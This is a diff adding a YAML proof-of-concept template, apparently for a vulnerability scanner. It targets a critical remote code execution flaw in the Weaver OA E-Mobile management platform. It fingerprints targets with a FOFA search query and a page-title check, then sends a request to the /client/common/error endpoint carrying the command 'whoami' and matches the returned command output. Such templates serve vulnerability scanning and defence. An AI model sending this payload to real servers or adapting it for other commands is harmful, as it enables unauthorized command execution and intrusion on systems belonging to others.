@@ -1,0 +1,17 @@
+id: poc-yaml-weaver-e-mobile-error-rce
+info:
+  name: 泛微OA E-Mobile移动管理平台 error 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: e-mobile
+  fofa: app="泛微-EMobile" && icon_hash="2062026853"
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(title,"移动管理平台-企业管理")
+- method: GET
+  path: /client/common/error?a=whoami
+  expression: status_code == 200 && matches(body,"<cmd>.*?</cmd>") && contains(body,"抱歉,出错了")
+variables: {}
+transport: http
